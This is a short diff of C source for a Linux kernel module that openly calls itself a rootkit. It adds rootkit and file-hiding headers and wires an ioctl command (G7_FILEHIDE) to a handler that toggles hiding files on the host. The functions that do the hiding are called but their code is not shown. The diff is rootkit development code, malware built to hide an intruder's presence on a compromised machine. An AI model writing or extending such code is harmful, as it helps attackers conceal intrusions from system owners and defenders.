@@ -3,11 +3,15 @@
 #include <linux/uaccess.h>
 
 #include "common.h"
+#include "rootkit.h"
 #include "ioctl.h"
+#include "filehide.h"
 
 #define BUFLEN 4096
 
 static char buf[BUFLEN];
+
+extern rootkit_t rootkit;
 
 void
 report_channels(void)
@@ -19,15 +23,15 @@ report_channels(void)
     DEBUG_NOTICE("-----------------------------------\n");
 }
 
-channel
+channel_t
 detect_channel(unsigned int cmd)
 {
     switch (cmd) {
-    case G7_PING:     return (channel){ "PING",     handle_ping     };
-    case G7_FILEHIDE: return (channel){ "FILEHIDE", handle_filehide };
+    case G7_PING:     return (channel_t){ "PING",     handle_ping     };
+    case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
     }
 
-    return (channel){ "unknown", NULL };
+    return (channel_t){ "unknown", NULL };
 }
 
 int
@@ -45,5 +49,14 @@ handle_ping(unsigned long arg)
 int
 handle_filehide(unsigned long arg)
 {
+    bool set;
+
+    if ((set = rootkit.hiding_files ^= 1))
+        hide_files();
+    else
+        unhide_files();
+
+    DEBUG_NOTICE("filehide toggled %s", set ? "on" : "off");
+
     return 0;
 }
